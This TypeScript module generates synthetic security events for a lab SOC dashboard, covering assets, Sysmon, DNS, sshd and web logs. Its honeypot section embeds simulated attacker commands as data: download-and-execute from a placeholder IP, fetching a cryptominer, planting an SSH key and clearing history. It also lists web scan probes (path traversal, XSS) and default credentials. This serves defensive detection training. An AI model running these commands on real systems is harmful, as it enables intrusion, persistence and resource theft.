// Synthetic telemetry for the VYOMRIX lab network. Every second of time maps to a fixed
// random seed, so the same moment always produces the same events. That keeps the
// numbers stable across reloads while the stream still looks alive.

import { guid, hashString, hex, int, pick, rng, type Rand } from "./util";
import type { SecEvent } from "./types";

export interface Asset {
  id: string;
  hostname: string;
  ip: string;
  os: string;
  platform: "windows" | "linux";
  role: string;
  criticality: "Critical" | "High" | "Medium" | "Low";
  owner: string;
  internetFacing: boolean;
  waf: boolean;
  agent: string;
  zone: string;
  offline?: boolean;
}

export const ASSETS: Asset[] = [
  { id: "AST-001", hostname: "win-endpoint-01", ip: "10.10.20.15", os: "Windows 11 23H2", platform: "windows", role: "Finance workstation", criticality: "High", owner: "Finance", internetFacing: false, waf: false, agent: "Sysmon 15.15 + Wazuh 4.9.2", zone: "User LAN" },
  { id: "AST-002", hostname: "analyst-ws-02", ip: "10.10.20.22", os: "Windows 11 23H2", platform: "windows", role: "SOC analyst workstation", criticality: "Medium", owner: "Security Operations", internetFacing: false, waf: false, agent: "Sysmon 15.15 + Wazuh 4.9.2", zone: "User LAN" },
  { id: "AST-003", hostname: "dc-lab-01", ip: "10.10.10.10", os: "Windows Server 2022", platform: "windows", role: "Domain controller (corp.local)", criticality: "Critical", owner: "Infrastructure", internetFacing: false, waf: false, agent: "Sysmon 15.15 + Wazuh 4.9.2", zone: "Core" },
  { id: "AST-004", hostname: "fs-lab-01", ip: "10.10.40.20", os: "Windows Server 2022", platform: "windows", role: "File server", criticality: "Critical", owner: "Infrastructure", internetFacing: false, waf: false, agent: "Sysmon 15.15 + Wazuh 4.9.2", zone: "Server VLAN" },
  { id: "AST-005", hostname: "web-lab-01", ip: "10.10.30.20", os: "Ubuntu 24.04", platform: "linux", role: "Public website (nginx)", criticality: "High", owner: "Web Platform", internetFacing: true, waf: true, agent: "auditd + Wazuh 4.9.2", zone: "DMZ" },
  { id: "AST-006", hostname: "api-staging-01", ip: "10.10.30.24", os: "Ubuntu 24.04", platform: "linux", role: "Staging API (nginx + PHP FPM)", criticality: "High", owner: "Application Security", internetFacing: true, waf: true, agent: "auditd + Wazuh 4.9.2", zone: "DMZ" },
  { id: "AST-007", hostname: "linux-jump-01", ip: "10.10.20.31", os: "Ubuntu 22.04", platform: "linux", role: "SSH bastion", criticality: "High", owner: "Platform Engineering", internetFacing: true, waf: false, agent: "auditd + Wazuh 4.9.2", zone: "DMZ" },
  { id: "AST-008", hostname: "db-lab-01", ip: "10.10.40.12", os: "Debian 12", platform: "linux", role: "PostgreSQL (customer data)", criticality: "Critical", owner: "Data Platform", internetFacing: false, waf: false, agent: "auditd + Wazuh 4.9.2", zone: "Server VLAN" },
  { id: "AST-009", hostname: "honeypot-ssh-01", ip: "10.10.50.9", os: "Ubuntu 22.04 (Cowrie)", platform: "linux", role: "SSH honeypot", criticality: "Low", owner: "Threat Research", internetFacing: true, waf: false, agent: "Cowrie 2.5", zone: "Deception" },
  { id: "AST-010", hostname: "wazuh-manager", ip: "10.10.10.5", os: "Ubuntu 24.04", platform: "linux", role: "SIEM manager", criticality: "Critical", owner: "Security Operations", internetFacing: false, waf: false, agent: "Wazuh manager 4.9.2", zone: "Core" },
  { id: "AST-011", hostname: "legacy-win-01", ip: "10.10.20.44", os: "Windows 10 22H2", platform: "windows", role: "Legacy kiosk", criticality: "Medium", owner: "Facilities", internetFacing: false, waf: false, agent: "Sysmon 14.16", zone: "User LAN", offline: true },
];

export const assetByHost = (host: string) => ASSETS.find((a) => a.hostname === host);
export const hostByIp = (ip: string) => ASSETS.find((a) => a.ip === ip)?.hostname;

export interface World {
  isolated: Set<string>;
  blockedIps: Set<string>;
  disabled: Set<string>;
  wafMode: Record<string, "blocking" | "detection">;
}

export interface WebRequestDraft {
  host: string;
  ip: string;
  method: string;
  uri: string;
  status: number;
  bytes: number;
  ua: string;
  body?: string;
  run?: string;
  step?: number;
}

export interface Emitter {
  sec: number;
  r: Rand;
  world: World;
  emit(draft: Omit<SecEvent, "id" | "ts">, ms?: number): SecEvent;
  web(req: WebRequestDraft, ms?: number): { event: SecEvent; blocked: boolean };
}

// Builders --------------------------------------------------------------------------

const WIN = { product: "windows" };
const pidOf = (r: Rand) => int(r, 1200, 15800);

export interface ProcRef { guid: string; pid: number; image: string; cmd: string }

export function winProc(em: Emitter, o: { host: string; user: string; image: string; cmd: string; parent?: ProcRef; parentImage?: string; parentCmd?: string; integrity?: string; hash?: string; run?: string; step?: number }, ms?: number): ProcRef {
  const ref: ProcRef = { guid: guid(em.r), pid: pidOf(em.r), image: o.image, cmd: o.cmd };
  const parent = o.parent ?? { guid: guid(em.r), pid: pidOf(em.r), image: o.parentImage ?? "C:\\Windows\\explorer.exe", cmd: o.parentCmd ?? "C:\\Windows\\Explorer.EXE" };
  const exe = o.image.split("\\").pop() ?? o.image;
  em.emit({
    sensor: "Sysmon", logsource: { ...WIN, category: "process_creation" }, host: o.host, user: o.user,
    message: `Process Create: ${exe} ${o.cmd.length > 90 ? o.cmd.slice(0, 90) + "..." : o.cmd}`,
    fields: {
      EventID: 1, Computer: o.host, Image: o.image, OriginalFileName: exe.toUpperCase(), CommandLine: o.cmd, CurrentDirectory: o.user.includes("\\") ? `C:\\Users\\${o.user.split("\\")[1]}\\` : "C:\\Windows\\system32\\",
      User: o.user, IntegrityLevel: o.integrity ?? "Medium", ProcessGuid: ref.guid, ProcessId: ref.pid, ParentProcessGuid: parent.guid, ParentProcessId: parent.pid,
      ParentImage: parent.image, ParentCommandLine: parent.cmd, Hashes: `SHA256=${o.hash ?? hex(rng(hashString(o.image)), 64).toUpperCase()}`,
    },
    run: o.run, step: o.step,
  }, ms);
  return ref;
}

export function winSec(em: Emitter, host: string, eventId: number, fields: Record<string, string | number>, message: string, extra: { user?: string; run?: string; step?: number } = {}, ms?: number) {
  return em.emit({ sensor: "Windows Security", logsource: { ...WIN, service: "security" }, host, user: extra.user, message, fields: { EventID: eventId, Computer: host, ...fields }, run: extra.run, step: extra.step }, ms);
}

export function winNet(em: Emitter, o: { host: string; user: string; image: string; dstIp: string; dstPort: number; dstHost?: string; run?: string; step?: number }, ms?: number) {
  const src = assetByHost(o.host)?.ip ?? "10.10.0.1";
  return em.emit({
    sensor: "Sysmon", logsource: { ...WIN, category: "network_connection" }, host: o.host, user: o.user,
    message: `Network connection: ${o.image.split("\\").pop()} to ${o.dstHost ?? o.dstIp}:${o.dstPort}`,
    fields: { EventID: 3, Computer: o.host, Image: o.image, User: o.user, Protocol: "tcp", Initiated: "true", SourceIp: src, SourcePort: int(em.r, 49152, 65000), DestinationIp: o.dstIp, DestinationPort: o.dstPort, DestinationHostname: o.dstHost ?? "" },
    run: o.run, step: o.step,
  }, ms);
}

export function dns(em: Emitter, o: { host: string; query: string; answer?: string; run?: string; step?: number }, ms?: number) {
  const labels = o.query.split(".");
  const domain = labels.slice(-2).join(".");
  return em.emit({
    sensor: "DNS resolver", logsource: { category: "dns" }, host: o.host,
    message: `DNS query ${o.query} from ${o.host}`,
    fields: { query: o.query, query_domain: domain, record_type: "A", src_host: o.host, src_ip: assetByHost(o.host)?.ip ?? "", answer: o.answer ?? "", rcode: "NOERROR" },
    run: o.run, step: o.step,
  }, ms);
}

export function linuxProc(em: Emitter, o: { host: string; user: string; image: string; cmd: string; parentImage: string; run?: string; step?: number }, ms?: number) {
  return em.emit({
    sensor: "auditd", logsource: { product: "linux", category: "process_creation" }, host: o.host, user: o.user,
    message: `execve ${o.cmd}`,
    fields: { Computer: o.host, Image: o.image, CommandLine: o.cmd, ParentImage: o.parentImage, User: o.user, ProcessId: int(em.r, 2000, 64000), CurrentDirectory: o.user === "www-data" ? "/var/www/api" : `/home/${o.user}` },
    run: o.run, step: o.step,
  }, ms);
}

export function linuxNet(em: Emitter, o: { host: string; user: string; image: string; dstIp: string; dstPort: number; run?: string; step?: number }, ms?: number) {
  return em.emit({
    sensor: "auditd", logsource: { product: "linux", category: "network_connection" }, host: o.host, user: o.user,
    message: `connect ${o.image} to ${o.dstIp}:${o.dstPort}`,
    fields: { Computer: o.host, Image: o.image, User: o.user, DestinationIp: o.dstIp, DestinationPort: o.dstPort, SourceIp: assetByHost(o.host)?.ip ?? "" },
    run: o.run, step: o.step,
  }, ms);
}

export function sshd(em: Emitter, o: { host: string; event: "failed_password" | "invalid_user" | "accepted_password" | "accepted_publickey"; user: string; ip: string; run?: string; step?: number }, ms?: number) {
  const port = int(em.r, 30000, 60000);
  const text = {
    failed_password: `Failed password for ${o.user} from ${o.ip} port ${port} ssh2`,
    invalid_user: `Invalid user ${o.user} from ${o.ip} port ${port}`,
    accepted_password: `Accepted password for ${o.user} from ${o.ip} port ${port} ssh2`,
    accepted_publickey: `Accepted publickey for ${o.user} from ${o.ip} port ${port} ssh2: ED25519 SHA256:${hex(em.r, 12)}`,
  }[o.event];
  return em.emit({ sensor: "sshd", logsource: { product: "linux", service: "sshd" }, host: o.host, user: o.user, message: text, fields: { Computer: o.host, Event: o.event, TargetUser: o.user, SourceIp: o.ip, SourcePort: port }, run: o.run, step: o.step }, ms);
}

// Baseline --------------------------------------------------------------------------

const DOMAIN_USERS = ["CORP\\a.sharma", "CORP\\r.iyer", "CORP\\j.fernandes", "CORP\\p.nair", "CORP\\k.menon", "CORP\\svc_backup"];
const BENIGN_WIN = [
  { image: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", cmd: '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --type=renderer --lang=en-GB', parent: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" },
  { image: "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", cmd: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE" /recycle', parent: "C:\\Windows\\explorer.exe" },
  { image: "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", cmd: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE" "C:\\Users\\Public\\Q4_forecast.xlsx"', parent: "C:\\Windows\\explorer.exe" },
  { image: "C:\\Windows\\System32\\svchost.exe", cmd: "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule", parent: "C:\\Windows\\System32\\services.exe" },
  { image: "C:\\Windows\\System32\\conhost.exe", cmd: "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1", parent: "C:\\Windows\\System32\\cmd.exe" },
  { image: "C:\\Users\\Public\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe", cmd: '"Teams.exe" --system-initiated', parent: "C:\\Windows\\explorer.exe" },
  { image: "C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe", cmd: '"OneDrive.exe" /background', parent: "C:\\Windows\\explorer.exe" },
  { image: "C:\\Windows\\System32\\notepad.exe", cmd: '"C:\\Windows\\system32\\notepad.exe" C:\\Users\\Public\\notes.txt', parent: "C:\\Windows\\explorer.exe" },
  { image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", cmd: "powershell.exe -NoProfile -Command Get-Service | Where Status -eq Running", parent: "C:\\Windows\\explorer.exe" },
];
const BENIGN_DOMAINS = ["login.microsoftonline.com", "outlook.office365.com", "github.com", "api.github.com", "www.google.com", "update.googleapis.com", "teams.microsoft.com", "ctldl.windowsupdate.com", "slack.com", "pypi.org", "registry.npmjs.org", "ocsp.digicert.com", "wazuh.com", "ubuntu.com", "security.debian.org"];
const BENIGN_IPS = ["20.190.159.2", "52.97.183.2", "140.82.121.4", "142.250.180.4", "13.107.42.14", "35.186.224.25"];
const WEB_PATHS = [
  { uri: "/", bytes: 18421 }, { uri: "/pricing", bytes: 22104 }, { uri: "/blog/soc-metrics", bytes: 31877 }, { uri: "/static/app.4f2a.js", bytes: 184233 },
  { uri: "/static/site.css", bytes: 40121 }, { uri: "/api/v1/products?id=42", bytes: 1311 }, { uri: "/api/v1/products?id=7&sort=price", bytes: 1287 },
  { uri: "/api/v1/search?q=firewall", bytes: 2311 }, { uri: "/login", bytes: 6022 }, { uri: "/favicon.ico", bytes: 1150 },
];
const UAS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) Safari/605.1.15", "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) Mobile/15E148", "Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Firefox/132.0"];
const SCAN_PROBES = [
  { uri: "/.env", ua: "Mozilla/5.0 zgrab/0.x" }, { uri: "/wp-login.php", ua: "WPScan v3.8.25" }, { uri: "/api/v1/products?id=1'", ua: "Mozilla/5.0" },
  { uri: "/cgi-bin/../../../../etc/passwd", ua: "nuclei/3.3" }, { uri: "/?q=<script>alert(1)</script>", ua: "Mozilla/5.0" }, { uri: "/actuator/env", ua: "curl/8.4.0" },
];
export const HONEYPOT_SOURCES = ["198.51.100.66", "198.51.100.91", "198.51.100.140", "198.51.100.203", "203.0.113.12", "203.0.113.45", "203.0.113.150", "203.0.113.188", "203.0.113.9", "198.51.100.17", "198.51.100.230", "203.0.113.61"];
const HONEY_CREDS = [["root", "123456"], ["root", "root"], ["admin", "admin"], ["ubuntu", "ubuntu"], ["oracle", "oracle123"], ["test", "test"], ["pi", "raspberry"], ["user", "password"], ["root", "P@ssw0rd"], ["git", "git"], ["postgres", "postgres"], ["support", "support"]];

export function baselineSecond(em: Emitter) {
  const { r, sec } = em;
  const ms = () => Math.floor(r() * 1000);
  const live = (h: string) => !em.world.isolated.has(h);

  // Windows endpoints
  for (const host of ["win-endpoint-01", "analyst-ws-02"]) {
    if (live(host) && r() < 0.16) {
      const p = pick(r, BENIGN_WIN);
      winProc(em, { host, user: host === "win-endpoint-01" ? "CORP\\a.sharma" : "CORP\\r.iyer", image: p.image, cmd: p.cmd, parentImage: p.parent }, ms());
    }
    if (live(host) && r() < 0.1) winNet(em, { host, user: host === "win-endpoint-01" ? "CORP\\a.sharma" : "CORP\\r.iyer", image: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", dstIp: pick(r, BENIGN_IPS), dstPort: 443 }, ms());
  }
  if (live("fs-lab-01") && r() < 0.04) winProc(em, { host: "fs-lab-01", user: "NT AUTHORITY\\SYSTEM", image: "C:\\Windows\\System32\\svchost.exe", cmd: "C:\\Windows\\system32\\svchost.exe -k LocalServiceNetworkRestricted", parentImage: "C:\\Windows\\System32\\services.exe", integrity: "System" }, ms());
  if (r() < 0.02) em.emit({ sensor: "Sysmon", logsource: { product: "windows", category: "process_access" }, host: "fs-lab-01", user: "NT AUTHORITY\\SYSTEM", message: "Process accessed: MsMpEng.exe opened lsass.exe", fields: { EventID: 10, Computer: "fs-lab-01", SourceImage: "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090\\MsMpEng.exe", TargetImage: "C:\\Windows\\system32\\lsass.exe", GrantedAccess: "0x1410", CallTrace: "C:\\Windows\\SYSTEM32\\ntdll.dll+9d204" } }, ms());

  // Domain controller authentication
  if (r() < 0.1) {
    const user = pick(r, DOMAIN_USERS);
    const ws = pick(r, ["10.10.20.15", "10.10.20.22", "10.10.40.20"]);
    if (!em.world.disabled.has(user)) winSec(em, "dc-lab-01", 4624, { TargetUserName: user.split("\\")[1], TargetDomainName: "CORP", LogonType: 3, IpAddress: ws, WorkstationName: hostByIp(ws)?.toUpperCase() ?? "", AuthenticationPackageName: "Kerberos" }, `An account was successfully logged on: ${user} from ${ws}`, { user }, ms());
  }
  if (r() < 0.005) {
    const user = pick(r, DOMAIN_USERS);
    const ws = pick(r, ["10.10.20.15", "10.10.20.22", "10.10.20.44"]);
    winSec(em, "dc-lab-01", 4625, { TargetUserName: user.split("\\")[1], TargetDomainName: "CORP", LogonType: 2, IpAddress: ws, Status: "0xC000006D", SubStatus: "0xC000006A", WorkstationName: hostByIp(ws)?.toUpperCase() ?? "" }, `An account failed to log on: ${user} (bad password)`, { user }, ms());
  }

  // DNS
  const dnsHosts = ["win-endpoint-01", "analyst-ws-02", "fs-lab-01", "web-lab-01", "api-staging-01", "db-lab-01", "linux-jump-01"].filter(live);
  if (r() < 0.45 && dnsHosts.length) dns(em, { host: pick(r, dnsHosts), query: pick(r, BENIGN_DOMAINS), answer: pick(r, BENIGN_IPS) }, ms());
  if (r() < 0.003) dns(em, { host: "analyst-ws-02", query: `${hex(r, 40)}.d2x91.cloudfront.net` }, ms());
  if (r() < 0.0004) dns(em, { host: "win-endpoint-01", query: `${hex(r, 36)}.edge.vendor-telemetry.example` }, ms());

  // Web traffic, all of it passes through the WAF
  if (live("web-lab-01") && r() < 0.35) { const p = pick(r, WEB_PATHS); em.web({ host: "web-lab-01", ip: `198.51.100.${int(r, 2, 60)}`, method: "GET", uri: p.uri, status: r() < 0.06 ? 304 : 200, bytes: p.bytes, ua: pick(r, UAS) }, ms()); }
  if (live("api-staging-01") && r() < 0.18) { const p = pick(r, WEB_PATHS.filter((x) => x.uri.startsWith("/api"))); em.web({ host: "api-staging-01", ip: `198.51.100.${int(r, 2, 60)}`, method: "GET", uri: p.uri, status: 200, bytes: p.bytes, ua: pick(r, UAS) }, ms()); }
  if (r() < 0.006) { const probe = pick(r, SCAN_PROBES); em.web({ host: "web-lab-01", ip: `203.0.113.${int(r, 100, 140)}`, method: "GET", uri: probe.uri, status: 404, bytes: 512, ua: probe.ua }, ms()); }

  // SSH: bastion gets background internet noise, honeypot gets the real flood
  if (live("linux-jump-01") && r() < 0.01) sshd(em, { host: "linux-jump-01", event: r() < 0.5 ? "invalid_user" : "failed_password", user: pick(r, ["admin", "root", "test", "oracle"]), ip: pick(r, HONEYPOT_SOURCES) }, ms());
  if (live("linux-jump-01") && r() < 0.008) sshd(em, { host: "linux-jump-01", event: "accepted_publickey", user: "deploy", ip: "10.10.20.22" }, ms());
  if (r() < 0.22) {
    const [u, p] = pick(r, HONEY_CREDS);
    const ip = pick(r, HONEYPOT_SOURCES);
    em.emit({ sensor: "Cowrie", logsource: { product: "vyomrix", service: "honeypot" }, host: "honeypot-ssh-01", message: `login attempt [${u}/${p}] failed from ${ip}`, fields: { Event: "login_failed", SourceIp: ip, Username: u, Password: p, SessionId: hex(r, 12), Protocol: "ssh" } }, ms());
  }
  if (r() < 0.004) {
    const ip = pick(r, HONEYPOT_SOURCES);
    const session = hex(r, 12);
    const base = ms() % 300;
    em.emit({ sensor: "Cowrie", logsource: { product: "vyomrix", service: "honeypot" }, host: "honeypot-ssh-01", message: `login attempt [root/123456] succeeded from ${ip}`, fields: { Event: "login_success", SourceIp: ip, Username: "root", Password: "123456", SessionId: session, Protocol: "ssh" } }, base);
    const cmds = pick(r, [
      ["uname -a", "cat /proc/cpuinfo | grep name | wc -l", "cd /tmp; wget http://192.0.2.10/x86_64 -O .x; chmod +x .x; ./.x"],
      ["id", "cat /etc/passwd", "free -m", "ls -la /root"],
      ["nproc", "curl -s http://pool.minexmr.example/xmrig.tar.gz -o /tmp/x.tgz", "tar xzf /tmp/x.tgz"],
      ["echo 'ssh-rsa AAAAB3NzaC1yc2E attacker' >> ~/.ssh/authorized_keys", "history -c"],
    ]);
    cmds.forEach((c, i) => em.emit({ sensor: "Cowrie", logsource: { product: "vyomrix", service: "honeypot" }, host: "honeypot-ssh-01", message: `CMD: ${c}`, fields: { Event: "command", SourceIp: ip, Command: c, SessionId: session, Username: "root" } }, base + 120 * (i + 1)));
  }

  // Scheduled benign activity that legitimately trips rules (good false positive practice)
  if (sec % 1800 === 0 && live("db-lab-01")) linuxProc(em, { host: "db-lab-01", user: "svc_backup", image: "/usr/bin/tar", cmd: "tar czf /tmp/.backup_stage/pg_nightly.tgz /var/backups/pg", parentImage: "/usr/sbin/cron" }, 5);
  if (sec % 3600 === 900 && live("db-lab-01")) linuxProc(em, { host: "db-lab-01", user: "k.menon", image: "/usr/bin/pg_dump", cmd: "pg_dump -Fc analytics -f /tmp/.dba_export/analytics.dump", parentImage: "/bin/bash" }, 10);
  if (sec % 2400 === 600 && live("analyst-ws-02")) winProc(em, { host: "analyst-ws-02", user: "CORP\\r.iyer", image: "C:\\Windows\\System32\\net.exe", cmd: 'net group "Domain Admins" /domain', parentImage: "C:\\Windows\\System32\\cmd.exe" }, 20);
  if (sec % 2700 === 1200 && live("win-endpoint-01")) winProc(em, { host: "win-endpoint-01", user: "NT AUTHORITY\\SYSTEM", image: "C:\\Windows\\System32\\schtasks.exe", cmd: 'schtasks /create /tn "Adobe Acrobat Update Task" /tr "C:\\Program Files (x86)\\Common Files\\Adobe\\ARM\\1.0\\AdobeARM.exe" /sc daily /f', parentImage: "C:\\Windows\\Temp\\AcroRdrDCUpd.exe", integrity: "System" }, 30);
}
